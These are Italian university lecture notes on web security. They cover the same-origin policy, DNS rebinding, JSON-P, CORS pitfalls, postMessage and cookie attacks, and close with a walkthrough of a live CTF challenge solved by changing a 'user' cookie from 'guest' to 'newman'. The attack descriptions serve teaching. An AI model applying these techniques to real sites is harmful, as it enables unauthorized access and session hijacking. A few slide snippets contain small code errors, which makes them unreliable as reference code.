# Web Security: Part II

**Tags:** #ingegneria #sicurezza_informatica #web_security #browser_security #SOP

## 1. Introduzione e Crediti

Questa sezione introduce la seconda parte del corso sulla sicurezza web.

- **Autore:** Leonardo Querzoni (Sapienza University of Rome).
    
- **Licenza:** CC BY NC SA.
    
- **Crediti:** Materiale progettato da Emilio Coppa basato su lavori di Marco Squarcina, Mauro Tempesta e Fabrizio D'Amore.
    

---

## 2. Analogie: Sistema Operativo vs Browser

Le slide propongono un confronto strutturale tra le primitive di sicurezza di un Sistema Operativo (OS) tradizionale e quelle di un Web Browser moderno.

![[Pasted image 20260131132700.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** La tabella che confronta le colonne "Operating System" e "Web Browser".
> 
> **Meaning:** Il browser agisce come un vero e proprio sistema operativo per le applicazioni web, con primitive equivalenti.

Ecco le corrispondenze dirette evidenziate:

- **Primitives (Primitive):**
    
    - _OS:_ System calls.
        
    - _Browser:_ DOM, Web APIs.
        
- **Execution Units:**
    
    - _OS:_ Processes (Processi).
        
    - _Browser:_ Frames.
        
- **Storage:**
    
    - _OS:_ Disk.
        
    - _Browser:_ Cookies and local storage.
        
- **Principals (Soggetti):**
    
    - _OS:_ Users (Utenti).
        
    - _Browser:_ Origins (Origini).
        
- **Access Control (Controllo Accessi):**
    
    - _OS:_ Discretionary access control (DAC).
        
    - _Browser:_ Mandatory access control (MAC).
        
- **Vulnerabilities (Vulnerabilità):**
    
    - _OS:_ Buffer overflows.
        
    - _Browser:_ Cross-site scripting (XSS).
        

---

## 3. Javascript e Same Origin Policy (SOP)

Questa sezione approfondisce il modello di esecuzione del browser e le politiche di sicurezza fondamentali.

### Modello di Esecuzione Base del Browser

Ogni finestra, scheda (tab) o frame del browser esegue una serie di operazioni standard:

1. **Loads content:** Carica il contenuto.
    
2. **Renders pages:** Elabora HTML, fogli di stile (CSS) e script per visualizzare la pagina.
    
    - Può comportare il recupero (fetching) di risorse aggiuntive come immagini, frame, ecc.
        
3. **Reacts to events:** Reagisce agli eventi tramite JavaScript.
    
    - **User actions:** `OnClick`, `OnMouseover`, ecc.
        
    - **Rendering:** `OnLoad`, `OnUnload`, ecc.
        
    - **Timing:** `setTimeout`, `clearTimeout`, ecc.
        

---

## 4. JavaScript nelle Pagine Web

Gli script possono essere incorporati in una pagina in modi diversi. È fondamentale conoscere questi vettori per comprendere la superficie di attacco.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```HTML
// Inlined in the page:
<script>alert("Hello World!");</script>

// Stored in external files:
<script type="text/javascript" src="foo.js"></script>

// Specified as event handlers:
<a href="http://www.bar.com" onmouseover="alert('hi')">...</a>

// Pseudo-URLs in links:
<a href="javascript:alert('You clicked');">Click me</a>
```

> [!abstract] Code Analysis
> 
> - **Inline:** Codice eseguito direttamente nel blocco script.
>     
> - **External:** Codice caricato da una sorgente esterna (`src`).
>     
> - **Event Handlers:** Codice che parte al verificarsi di un evento UI (es. passaggio del mouse).
>     
> - **Pseudo-URLs:** Uso del protocollo `javascript:` all'interno di un attributo `href`.
>     

---

## 5. DOM e BOM [Recap]

JavaScript interagisce con la pagina HTML e con il browser attraverso due modelli a oggetti principali: il **DOM** e il **BOM**.



> [!abstract] Visual Analysis
> ![[Pasted image 20260131132732.png]]
>![[Pasted image 20260131132757.png]]> 
> **What to look at:** L'albero gerarchico che parte dall'oggetto radice `window`.
> 
> **Meaning:** `window` è l'oggetto globale che contiene sia il modello del documento (`document`) sia le API del browser (`navigator`, `screen`, etc.).

### Browser Object Model (BOM)

- Rappresenta le **Web APIs** specifiche del browser.
    
- Gli elementi principali includono:
    
    - `navigator` (tipo e versione del browser).
        
    - `screen`.
        
    - `location`.
        
    - `frames`.
        
    - `history`.
        
    - `XMLHttpRequest`.
        

### Document Object Model (DOM)

- È uno standard ("Living Standard") mantenuto da WHATWG/W3C.
    
- È una **rappresentazione orientata agli oggetti** della struttura della pagina.
    
- **Proprietà:** `document.forms`, `document.links`.
    
- **Metodi:** `document.createElement`, `document.getElementsByTagName`.
    
- Interagendo con il DOM, gli script possono **leggere e modificare** i contenuti della pagina web.
    

**Struttura gerarchica (Esempio):**

- `document`
    
    - `html`
        
        - `head` -> `title` ("Page Title")
            
        - `body`
            
            - `h1` ("Main Header")
                
            - `p` ("Paragraph")
                
            - `img` (src)
                

---

## 6. Manipolazione delle Proprietà con JavaScript [Recap]

JavaScript fornisce metodi per accedere e modificare l'albero DOM.

#### Lettura delle Proprietà

Considerando il seguente snippet HTML:

```HTML
<UL id="t1">
  <LI>Item 1</LI>
</UL>
```

**Here is the exact implementation shown in the slides:**

```JavaScript
document.getElementById('t1').nodeName
// -> returns 'UL'

document.getElementById('t1').getAttribute('id')
// -> returns 't1'

document.getElementById('t1').innerHTML
// -> returns '<li>Item 1</li>'

document.getElementById('t1').children[0].nodeName
// -> returns 'LI'

document.getElementById('t1').children[0].innerText
// -> returns 'Item 1'
```

#### Modifica della Pagina

JavaScript può modificare dinamicamente il DOM, ad esempio aggiungendo elementi o gestori di eventi.

**Here is the exact implementation shown in the slides:**

JavaScript

```
// Aggiungere un nuovo item alla lista
let list = document.getElementById('t1');
let item = document.createElement('LI');
item.innerText = 'Item 2';
list.appendChild(item);

// Aggiungere un event handler
let list = document.getElementById('t1');
list.addEventListener('click', (event) => {
 alert(`Clicked: ${event.target.innerText}`);
});
```

---

## 7. Browser Sandbox

Il browser implementa un meccanismo di isolamento per eseguire codice non fidato.

![[Pasted image 20260131132842.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** L'immagine mostra contenuti (immagini, script) confinati all'interno di un "recinto" (sandbox).
> 
> **Meaning:** Il codice remoto non deve poter uscire dal contesto del browser per toccare il sistema sottostante.

- **Obiettivo:** Eseguire in sicurezza codice JavaScript fornito da un sito web remoto, forzando l'isolamento dalle risorse fornite da altri siti web.
    
- **Restrizioni:**
    
    - Nessun accesso diretto ai **file**.
        
    - Accesso limitato a:
        
        - OS (Sistema Operativo).
            
        - Network (Rete).
            
        - Browser data (Dati del browser).
            
        - Contenuto proveniente da altri siti web.
            

---

## 8. Same Origin Policy (SOP)

La SOP è la **baseline security policy** (politica di sicurezza di base) implementata dai web browser.

### Definizione di Origin

Un'origine è definita dalla seguente tripletta:

$$(\text{protocol}, \text{domain}, \text{port})$$

### Regole di Accesso

Script in esecuzione su una pagina ospitata su una certa origine possono accedere **solo** alle risorse della **stessa origine**.

**Cosa è bloccato (o limitato) verso altre origini:**

- Accesso (read / write) al **DOM** di altri frame.
    
- Accesso (read / write) al **cookie jar** (nota: i cookie hanno un concetto di origine diverso) e local/session storage.
    
- Accesso (read) al **body** di una risposta di rete.
    

**Cosa NON è soggetto a SOP (Eccezioni):**

- Inclusione di risorse (`images`, `scripts`, ...).
    
- Form submission (invio di moduli).
    
- Invio di richieste (es. via fetch API).
    

### Esempi di Same Origin Policy

Confronto rispetto all'URL di riferimento: `https://example.com/index.htm`

|**URL**|**Same origin?**|**Reason**|
|---|---|---|
|`https://example.com/profile.htm`|**Yes**|Differisce solo il percorso (path).|
|`http://example.com/index.htm`|**No**|Protocollo diverso (`http` vs `https`).|
|`https://shop.example.com/index.html`|**No**|Hostname diverso (sottodominio).|
|`https://example.com:456/index.htm`|**No**|Porta diversa (default HTTPS è 443).|

---

## 9. Complessità della SOP

Nonostante sia fondamentale, la SOP è difficile da definire formalmente.

- **Problema:** Non esiste una definizione formale di SOP.
    
- **Evoluzione:** È evoluta tramite un approccio "penetrate-and-patch" (penetrazione e correzione).
    
- **Incoerenza:** Funzionalità diverse si sono evolute in politiche leggermente differenti.
    
- **Studio USENIX Security 2017:**
    
    - Titolo: _"Same-Origin Policy: Evaluation in Modern Browsers"_.
        
    - Ha valutato 10 browser diversi.
        
    - I browser si comportano diversamente nel **23%** dei test (focalizzandosi solo sull'accesso al DOM).
        

---

## 10. DNS Rebinding

Il DNS Rebinding è un attacco (noto da 12 anni) che aggira la SOP abusando del sistema DNS.

> [!abstract] Visual Analysis
> ![[Pasted image 20260131132912.png]]
>![[Pasted image 20260131132934.png]]
> 
> **What to look at:** Lo schema che collega "Victim", "evil.com" (Attacker) e "Corporate web server" (Target interno).
> 
> **Meaning:** L'attaccante usa il DNS per far credere al browser che il suo server e il server interno (es. 10.0.0.3) siano la stessa origine.

### Obiettivo dell'attacco

Può essere usato per violare una rete privata, inducendo il browser della vittima ad accedere a computer con **indirizzi IP privati** e a esfiltrare i risultati a terze parti non autorizzate.

### Fasi dell'attacco

1. **Richiesta Iniziale:** La vittima visita `evil.com`.
    
2. **Prima Risposta DNS:** Il server DNS dell'attaccante (`ns.evil.com`) risponde con l'IP reale dell'attaccante (`31.33.33.37`) con un **TTL (Time To Live) molto breve** (es. 60 secondi).
    
3. **Caricamento:** La pagina viene caricata ed esegue uno script malevolo.
    
4. **Attesa:** Lo script attende che la cache DNS scada.
    
5. **Seconda Richiesta (Fetch):** Lo script esegue una `fetch` verso `https://evil.com/secret`.
    
6. **Seconda Risposta DNS (Rebind):** Poiché il TTL è scaduto, il browser fa una nuova richiesta DNS. Questa volta `ns.evil.com` risponde con l'IP target interno (`10.0.0.3`).
    
7. **Aggiramento SOP:** Per il browser, l'origine è sempre `https://evil.com`, quindi permette la richiesta. Tuttavia, la richiesta viene inviata fisicamente al server aziendale interno (`10.0.0.3`).
    

### Mitigazioni contro DNS Rebinding

1. **DNS Pinning:**
    
    - I browser potrebbero bloccare l'indirizzo IP al valore ricevuto nella prima risposta DNS.
        
    - _Problema:_ Compatibilità con usi di DNS dinamico, load balancing, ecc.
        
2. **Verifica Host Header:**
    
    - I web server possono rifiutare richieste HTTP con header `Host` non riconosciuti.
        
    - I virtual host di default "catchall" nella configurazione del web server dovrebbero essere evitati.

# Web Security: JSON-P & CORS

**Tags:** #ingegneria #sicurezza_informatica #web_security #JSONP #CORS #SOP

## 1. JSON with Padding (JSON-P)

A volte è desiderabile permettere la lettura di risorse **cross-origin**. Per ottenere questo risultato, gli sviluppatori hanno ideato **JSON-P**, descritto nelle slide come una "hack technique".

Questa tecnica sfrutta il fatto che l'inclusione di script (`<script src="...">`) **non è soggetta alla Same Origin Policy (SOP)**.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```html
<HTML>
<SCRIPT>
function foo(data) {
/* do stuff */
GET http://b.com/api.js?cb=foo
}
</SCRIPT>
<SCRIPT src =
"http://b.com/api.js?cb=
foo"></SCRIPT>
</HTML>
foo({
"name": "Pi",
"age": "NaN"
})
```

> [!abstract] Code Analysis
> ![[Pasted image 20260131133040.png]]
> 1. Viene definita una funzione locale `foo(data)` che elaborerà i dati.
>     
> 2. Viene iniettato un tag `<SCRIPT>` che punta a un'API esterna (`http://b.com/api.js`), passando il nome della funzione come parametro (`?cb=foo`).
>     
> 3. Il server risponde restituendo del codice JavaScript eseguibile: la chiamata alla funzione `foo` con i dati JSON passati come argomento.
>     

---

## 2. Esempi reali e Vulnerabilità

Esistono diversi endpoint JSON-P "in the wild". Le slide mostrano un esempio specifico relativo a Google.

**Esempio:** `https://accounts.google.com/o/oauth2/revoke?callback=`

![[Pasted image 20260131133101.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo screenshot della console del browser (Chrome Developer Tools).
> 
> **Meaning:**
> 
> - L'utente tenta di passare `alert(1)` come callback.
>     
> - Il server risponde con un errore JSON (`code: 400`), indicando che il nome della callback non è valido: _"Invalid JSONP callback name... only alphabet, number, '_', '$', '.' and '[' ']' are allowed"_.
>     
> - Questo dimostra che i server moderni applicano validazioni rigorose per prevenire abusi.
>     

---

## 3. Problemi con JSON-P

L'uso di JSON-P comporta diverse criticità di sicurezza e limitazioni funzionali:

- Possono essere eseguite **solo richieste GET**.
    
- L'endpoint potrebbe validare l'header `Referer`, ma questo può essere falsificato o mancare.
    
- Richiede **completa fiducia** nell'host di terze parti:
    
    - La terza parte è autorizzata a eseguire script all'interno della pagina che importa la risorsa.
        
    - L'origine importatrice **non può eseguire alcuna validazione** dello script incluso.
        

**Conclusione:** JSON-P non dovrebbe più essere utilizzato. Serve una soluzione migliore.

---

## 4. Cross-Origin Resource Sharing (CORS)

**CORS** fornisce un modo controllato per "rilassare" la SOP (Same Origin Policy).

- Permette a JavaScript di accedere al contenuto di risorse **cross-site**.
    
- JavaScript può accedere al contenuto della risposta se l'header `Origin` nella richiesta corrisponde all'header `Access-Control-Allow-Origin` nella risposta (o se quest'ultimo ha valore `*`).
    

![[Pasted image 20260131133139.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Il flusso tra `http://example.com` (Browser) e `api.com` (Server).
> 
> **Meaning:**
> 
> 1. Il browser invia: `Origin: http://example.com`.
>     
> 2. Il server risponde: `Access-Control-Allow-Origin: http://example.com`.
>     
> 3. Poiché il server ha inserito l'origine in **whitelist**, il browser permette allo script di leggere la risposta.
>     

---

## 5. CORS con Simple Requests

Nelle richieste semplici (es. GET standard), lo scambio di header avviene direttamente.

![[Pasted image 20260131133226.png]]
#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```html
<HTML>
<SCRIPT>
// http://a.com
fetch("http://b.com")
.then(/*do stuff*/)
</SCRIPT>
</HTML>
```

**Analisi del traffico HTTP:**

```html
GET / HTTP/2.0
Host: b.com
Origin: http://a.com

200 OK HTTP/2.0
Access-Control-Allow-Origin: *
```

> [!abstract] Code Analysis
> 
> Il server risponde con `Access-Control-Allow-Origin: *`, permettendo a **qualsiasi origine** di accedere alla risorsa.

---

## 6. CORS con Credenziali

Quando vengono inviate credenziali (cookie, certificati TLS, BasicAuth), le regole diventano più severe.

![[Pasted image 20260131133240.png]]
#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```javascript
// http://a.com
fetch("http://b.com",
{credentials: "include"})
.then(/*do stuff*/)
```

**Analisi del traffico HTTP:**

```http
GET / HTTP/2.0
Host: b.com
Cookie: SID=12345
Origin: http://a.com

200 OK HTTP/2.0
Access-Control-Allow-Origin: http://a.com
Access-Control-Allow-Credentials: true
```

> [!abstract] Security Constraint
> 
> Quando sono coinvolte credenziali:
> 
> 1. L'header `Access-Control-Allow-Credentials` deve essere fornito e impostato su **true**.
>     
> 2. `Access-Control-Allow-Origin` **NON può essere `*`**. Deve specificare esplicitamente l'origine.
>     

---

## 7. CORS con Non-Simple Requests (Pre-flight)

Se la richiesta usa metodi non standard (es. `PUT`), il browser esegue una richiesta preliminare (**Pre-flight**) usando il metodo `OPTIONS`.

![[Pasted image 20260131133751.png]]
#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```JavaScript
// http://a.com
fetch("http://b.com",
{method: "PUT"})
.then(/*do stuff*/)
```

**1. Pre-flight Request (OPTIONS):**

```HTTP
OPTIONS / HTTP/2.0
Host: b.com
Origin: http://a.com
Access-Control-Request-Method: PUT

204 No Content HTTP/2.0
Access-Control-Allow-Origin: http://a.com
Access-Control-Allow-Methods: PUT, DELETE
```

**2. Actual Request (PUT):**

```HTTP
PUT / HTTP/2.0
Host: b.com
Origin: http://a.com

200 OK HTTP/2.0
Access-Control-Allow-Origin: http://a.com
```

> [!abstract] Mechanism Analysis
> 
> Il server deve mettere in whitelist l'origine anche nella **actual request** (la richiesta PUT effettiva) per rendere il contenuto della risposta disponibile allo script.

---

## 8. Header CORS: Riepilogo

Le slide forniscono un elenco tecnico degli header coinvolti.

### Request headers (usati nella richiesta pre-flight)

- `Access-Control-Request-Method`: Il metodo HTTP che sarà usato nella richiesta effettiva.
    
- `Access-Control-Request-Headers`: Lista di header HTTP custom che saranno inviati nella richiesta effettiva.
    

### Response headers

- `Access-Control-Allow-Origin`: Usato per mettere in whitelist le origini. Valori permessi: `null`, `*` o un'origine specifica.
    
    - _Nota:_ Il valore `*` non può essere usato se è specificato `Access-Control-Allow-Credentials`.
        
- `Access-Control-Allow-Methods`: Lista dei metodi HTTP permessi.
    
- `Access-Control-Allow-Headers`: Lista degli header HTTP custom permessi.
    
- `Access-Control-Expose-Headers`: Lista degli header HTTP di risposta che saranno disponibili a JS.
    
- `Access-Control-Allow-Credentials`: Usato quando la richiesta include credenziali client.
    
- `Access-Control-Max-Age`: Usato per il caching delle richieste pre-flight.
    

---

## 9. Pitfalls (Insidie) nelle Configurazioni CORS

Fino a poco tempo fa esistevano due specifiche CORS diverse:

1. **W3C:** Permette una lista di origini in `Access-Control-Allow-Origin`.
    
2. **Fetch API:** Permette una **singola origine** in `Access-Control-Allow-Origin`.
    

**Situazione Attuale:**

- I browser implementano CORS dalla **Fetch API** (la specifica W3C è ora deprecata).
    
- Questo complica la configurazione lato server: le applicazioni devono usare **codice custom** per validare le origini permesse, invece di fornire semplicemente un header statico con tutte le origini in whitelist.
    

---

## 10. Pitfall #1 - Broken Origin Validation

Un errore comune è l'uso di espressioni regolari (Regex) errate nelle configurazioni server (es. Nginx).

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

Nginx

```
if ($http_origin ~ "http://(example.com|foo.com)") {
 add_header "Access-Control-Allow-Origin" $http_origin;
}
```

> [!abstract] Vulnerability Analysis
> 
> La regex sopra è vulnerabile perché controlla solo la presenza della stringa, non l'esatta corrispondenza del dominio.
> 
> **Origini permesse erroneamente:**
> 
> - `http://example.com` (Corretto)
>     
> - `http://foo.com` (Corretto)
>     
> - `http://example.com.evil.com` (**Vulnerabilità**: L'attaccante registra un sottodominio malevolo che contiene il nome del dominio target).
>     

---

## 11. Pitfall #2 - The null origin

L'header `Access-Control-Allow-Origin` può specificare il valore `null`.

I browser possono inviare l'header `Origin` con valore `null` in condizioni particolari:

- Redirect **Cross-site**.
    
- Richieste che usano il protocollo `file:`.
    
- Richieste **Sandboxed cross-origin**.
    

**Vulnerabilità:**

Un attaccante può falsificare richieste con l'header `Origin` impostato a `null` eseguendo richieste cross-origin da un **iframe sandboxed**.

# Web Security: Client-side Messaging & Cookies

**Tags:** #ingegneria #sicurezza_informatica #web_security #cookies #postMessage #SOP

## 1. Client-Side Messaging via postMessage

La comunicazione lato client tra finestre di origini diverse (es. frame incorporati ed embedder frame) è possibile tramite la Web API **postMessage**. Questa API abilita lo scambio di messaggi **cross-origin**.

![[Pasted image 20260131133835.png]]
#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

**Receiver ([http://a.com](http://a.com)):**

```JavaScript
<SCRIPT>
window.addEventListener('message', (evt) => {
if (evt.origin === 'http://b.com') {
/* process message (evt.data) and reply
 using postMessage() */
}
})
</SCRIPT>
```

**Sender ([http://b.com](http://b.com)):**

```JavaScript
<SCRIPT>
window.parent.sendMessage(
'Hello!', 'http://a.com');
/* The parent will receive the message
 only if the origin is the specified one (*
 can be used to ignore this restriction) */
</SCRIPT>
<IFRAME src="http://b.com">
```

> [!abstract] Code Analysis
> 
> - **Sender:** Specifica il messaggio e l'origine target (`http://a.com`). Se si usa `*`, la restrizione sull'origine viene ignorata.
>     
> - **Receiver:** Aggiunge un event listener per l'evento `'message'`.
>     
> - **Controllo Fondamentale:** Il ricevitore controlla `evt.origin` per assicurarsi che il messaggio provenga da una fonte attendibile (`http://b.com`).
>     

### Validazione dei Messaggi in Ingresso

I gestori dei messaggi (**Message handlers**) devono validare il campo `origin` dei messaggi in arrivo per comunicare solo con le origini desiderate.

- **Rischi:** Il mancato controllo può portare a vulnerabilità di sicurezza (es. se il messaggio ricevuto viene valutato come script o incorporato in modo non sicuro in una pagina).
    
- **Dati dello studio (PMForce):** Uno studio recente ha trovato 377 gestori vulnerabili nei primi 100k siti.
    
    - Problemi comuni: mancanza di controllo dell'origine o implementazione errata (es. match di sottostringhe).
        

---

## 2. Cookies: Infrastruttura e Attributi

Le slide presentano i cookie ironicamente come "un fragile file di testo mantenuto manualmente e copiato da qualche posizione casuale su internet", evidenziando la loro natura basilare ma critica.

![[Pasted image 20260131133904.png]]
### Struttura di un Cookie

Un cookie viene impostato dal server tramite l'header HTTP `Set-Cookie` e inviato dal client tramite l'header `Cookie`.

![[Pasted image 20260131133921.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo scambio HTTP tra client e server e la tabella degli attributi.
> 
> **Meaning:**
> 
> - Il server invia: `Set-Cookie: nome=valore`
>     
> - Il browser memorizza e invia nelle richieste successive: `Cookie: nome=valore`
>     
> - Un cookie possiede **Attributi** (`Expires`, `Max-Age`, `Domain`, `Path`, `SameSite`) e **Flags** (`Secure`, `HttpOnly`).
>     

---

## 3. Scope dei Cookies (Ambito)

Lo scope definisce chi può leggere o ricevere un cookie.

![[Pasted image 20260131133940.png]]
### Attributo Domain

![[Pasted image 20260131134003.png]]

L'attributo `Domain` determina quali host possono ricevere il cookie.

1. **Attributo NON impostato:** Il cookie è allegato solo alle richieste verso il dominio che lo ha impostato (host-only).
    
2. **Attributo impostato:** Il cookie è allegato alle richieste verso il dominio specificato e **tutti i suoi sottodomini**.
    
    - Il valore può essere qualsiasi suffisso del dominio della pagina che imposta il cookie, fino al **registrable domain**.
        
    - **Rischio:** Un attaccante su un dominio correlato ("related-domain attacker") può impostare cookie che vengono inviati al sito web target.
        

#### Regole di Validità del Domain Attribute

|**Domain setting the cookie**|**Value of the Domain attribute**|**Allowed?**|**Reason**|
|---|---|---|---|
|`a.b.example.com`|`example.com`|**Yes**|il valore dell'attributo è il registrable domain|
|`www.example.ac.at`|`ac.at`|**No**|`ac.at` è un public suffix|
|`a.example.com`|`b.example.com`|**No**|il valore dell'attributo non è un suffisso di `a.example.com`|


> [!abstract] Visual Analysis
> ![[Pasted image 20260131134035.png]]
> **What to look at:** La gerarchia dei domini (`example.com` sopra a `shop.example.com`, ecc.).
> 
> **Meaning:** Se `example.com` imposta un cookie con `domain=.example.com`, quel cookie sarà visibile a **tutti** i sottodomini (es. `myprofile.shop.example.com`, `evil.example.com`). Per restringere lo scope al solo dominio che lo ha creato, l'attributo `domain` **non deve essere specificato**.

---

## 4. Altri Attributi dei Cookie

### Path

- Usa per restringere lo scope del cookie a uno specifico percorso URL.
    
- Il cookie viene allegato solo se il suo `path` è un **prefisso** del path dell'URL della richiesta.
    
- _Esempio utile:_ `example.com/userA` vs `example.com/userB`.
    
- Se non impostato: il path è quello della pagina che imposta il cookie.
    
- Se impostato: non ci sono restrizioni sul suo valore.
    

### Secure

- Se impostato, il cookie viene allegato **solo a richieste HTTPS** (garantisce confidenzialità).
    
- Recentemente, i browser impediscono che i cookie `Secure` vengano impostati (o sovrascritti) da richieste HTTP (garantisce integrità).
    

### HttpOnly

- Se impostato, **JavaScript non può leggere** il valore del cookie tramite `document.cookie`.
    
- **Limitazione:** Non fornisce integrità. Uno script può sovrascrivere il "cookie jar" (vasiere dei cookie), cancellando i vecchi cookie e impostandone uno nuovo.
    
- **Utilità:** Previene il furto di cookie sensibili (es. identificatori di sessione) in caso di vulnerabilità XSS.
    

### Max-Age e Expires

Definiscono quando il cookie scade.

- **Entrambi non impostati:** Il cookie viene cancellato alla chiusura del browser (cookie di sessione).
    
- **Max-Age negativo o Expires nel passato:** Il cookie viene cancellato dal cookie jar.
    
- **Precedenza:** Se entrambi sono specificati, `Max-Age` ha la precedenza.
    

---

## 5. Attributo SameSite

![[Pasted image 20260131134138.png]]

Controlla se il cookie deve essere allegato alle richieste **cross-site**.

**Definizione di Cross-site:** Una richiesta è cross-site se il dominio dell'URL target e quello della pagina che innesca la richiesta non condividono lo stesso **registrable domain**.

- `a.example.com` -> `b.example.com`: **Same-site** (dominio registrabile `example.com`).
    
- `example.com` -> `bank.com`: **Cross-site**.
    

**Valori dell'attributo:**

1. **Strict:** Il cookie non è **mai** allegato a richieste cross-site.
    
2. **Lax:** Il cookie viene inviato anche in caso di richieste cross-domain, ma solo se c'è un cambiamento nella **navigazione top-level** (l'utente se ne accorge, es. cliccando un link).
    
3. **None:** Il cookie è **sempre** allegato a tutte le richieste cross-site.
    

### Cambiamenti recenti (Feb. 2020)

- **Default:** `SameSite = Lax`. I cookie senza attributo esplicito sono trattati come Lax.
    
- **Dipendenza Secure:** `SameSite = None` implica `Secure`. I cookie con `SameSite=None` vengono scartati se non hanno anche l'attributo `Secure`.
    

---

## 6. SOP per la Lettura dei Cookie

Un cookie viene allegato a una richiesta verso un URL `u` se sono soddisfatti i seguenti vincoli:

1. **Dominio:** Se l'attributo `Domain` è impostato, deve essere un suffisso del dominio dell'host di `u`. Altrimenti, l'hostname di `u` deve essere uguale al dominio della pagina che ha impostato il cookie.
    
2. **Path:** L'attributo `Path` deve essere un prefisso del percorso di `u`.
    
3. **Secure:** Se l'attributo `Secure` è impostato, il protocollo di `u` deve essere HTTPS.
    
4. **SameSite:** Se la richiesta è cross-site, devono essere rispettati i requisiti dell'attributo `SameSite`.
    

---

## 7. Problemi del Protocollo dei Cookie e Cookie Tossing

### Problemi di Protocollo

L'header `Cookie` inviato dal browser contiene solo le coppie **nome-valore**.

- Il server **non sa** se il cookie è stato impostato su una connessione sicura.
    
- Il server **non sa** quale dominio ha impostato il cookie ricevuto.
    
- Il server **non sa** il path del cookie.
    

### Cookie Tossing

Impostando l'attributo domain (es. `.domain.com`), i sottodomini possono forzare un cookie verso altri sottodomini, domini correlati o persino il dominio apice (apex domain).

- La chiave nel "cookie jar" è la tripla `(name, domain, path)`.
    
- Quando i cookie vengono inviati, gli attributi vengono persi.
    
- **Comportamento del Server:** La maggior parte accetta la **prima occorrenza** dei cookie con lo stesso nome.
    
- **Comportamento del Browser:** La maggior parte ordina i cookie:
    
    1. Quelli con **path più lunghi** prima di quelli con path più corti.
        
    2. Quelli creati prima (o in base all'implementazione).
        

**Impatto:** Bypass delle protezioni CSRF, Login CSRF, Session Fixation.

---

## 8. Vulnerabilità: Cookie Overwrite & Cookie Jar Overflow

### Cookie Overwrite

Un attaccante su un sottodominio (es. `evil.example.com`) può sovrascrivere i cookie di un dominio legittimo (es. `introsec.example.com` o `example.com`) impostando un cookie con lo stesso nome ma con scope più ampio (es. `domain=.example.com`).

![[Pasted image 20260131134156.png]]

> [!abstract] Visual Analysis
> ![[Pasted image 20260131134230.png]]![[Pasted image 20260131134240.png]]![[Pasted image 20260131134245.png]]
> **What to look at:** Il diagramma mostra `evil.example.com` che imposta `SESSID=1337` e `example.com` che vede questo cookie.
> 
> **Meaning:** Poiché il server riceve solo `name=value`, se l'attaccante riesce a far inviare il suo cookie prima di quello legittimo, il server autenticherà la richiesta nel contesto dell'attaccante ("Welcome Attacker!" invece di "Welcome Bob!").

### Cookie Jar Overflow

![[Pasted image 20260131135710.png]]
![[Pasted image 20260131135728.png]]![[Pasted image 20260131135738.png]]
I browser hanno un limite sul numero di cookie che un **apex domain** può avere.

- Quando non c'è più spazio, i cookie **più vecchi vengono cancellati**.
    
- **Attacco:** Gli attaccanti possono inondare ("overflow") il cookie jar per:
    
    1. Sovrascrivere cookie `HttpOnly`.
        
    2. Aggirare le protezioni contro il cookie tossing sui server che bloccano richieste con cookie duplicati.
        

**Esempio di attacco (Testato su Chrome):**

1. Esiste un cookie legittimo `session=legit` (HttpOnly).
    
2. L'attaccante esegue uno script che crea centinaia di cookie "spazzatura" (`overflow_0`, `overflow_1`...).
    
3. Il cookie legittimo (più vecchio) viene espulso per fare spazio.
    
4. L'attaccante imposta un nuovo cookie `session=1337` (non HttpOnly o controllato da lui).
    

---

## 9. Cookie Prefixes

Per mitigare le ambiguità, sono stati proposti i prefissi dei cookie, che forniscono al server garanzie di sicurezza basate sul nome del cookie.

1. `__Secure-`:
    
    - Se un cookie ha questo prefisso, viene accettato dal browser solo se marcato come **Secure**.
        
    - Garantisce integrità rispetto ad attaccanti di rete.
        
2. `__Host-`:
    
    - Se un cookie ha questo prefisso, viene accettato solo se:
        
        - È marcato **Secure**.
            
        - **NON** include l'attributo `Domain` (è host-only).
            
        - Ha l'attributo `Path` impostato a `/`.
            
    - Garantisce integrità rispetto ad attaccanti su domini correlati (related-domain attackers).

# Web Security: Training Challenge & Recap

**Tags:** #ingegneria #sicurezza_informatica #web_security #cookies #training #CTF

## 1. Training Challenge #11: Jurassic Park

Le slide presentano un caso di studio pratico ("Training challenge #11") basato sul sistema del film Jurassic Park.

- **URL:** `https://training11.webhack.it`
    
- **Descrizione:** WebHackIT ha distribuito il sistema che gestiva Jurassic Park. Tuttavia, la sicurezza non è stata presa in considerazione da "Newman" (il personaggio sviluppatore nel film).
    
- **Stato:** La challenge è **LIVE**.
    

### Analisi della Challenge

Accedendo alla pagina principale (`/`), viene visualizzato un messaggio di saluto: "Hi from Newman!".

Tentando di accedere all'area di amministrazione (`/admin`), il sistema risponde con una gif di Dennis Nedry e il messaggio:

**"YOU DIDN'T SAY THE MAGIC WORD!"**

![[Pasted image 20260131135822.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** La schermata di errore con l'immagine di Jurassic Park.
> 
> **Meaning:** L'accesso alla pagina `/admin` è negato.

### Analisi Tecnica

1. **Assenza di Login Form:** L'applicazione ha una pagina admin, ma non è presente un modulo di login visibile.
    
2. **Ipotesi:** L'autenticazione viene eseguita in altri modi, presumibilmente tramite **cookie**.
    

Ispezionando i cookie tramite gli strumenti di sviluppo del browser (DevTools -> Application -> Cookies), si nota la presenza di:

- `challenge_auth_token` (probabilmente un JWT o simile).
    
- `user` con valore impostato a **`guest`**.
    
![[Pasted image 20260131135850.png]]
#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

Plaintext

```
Name: user
Value: guest
Domain: training11.webhack...
Path: /
```

> [!abstract] Code Analysis
> 
> Il cookie `user` identifica il ruolo dell'utente corrente. Attualmente è impostato su `guest`, il che spiega perché l'accesso admin è negato.

---

## 2. Exploitation: Manipolazione dei Cookie

Il problema di sicurezza identificato è che **possiamo manipolare i cookie a nostro piacimento** lato client.

### Attacco

1. L'utente modifica manualmente il valore del cookie `user`.
    
2. Il valore viene cambiato da `guest` a **`newman`** (il nome dello sviluppatore/admin del sistema).
    
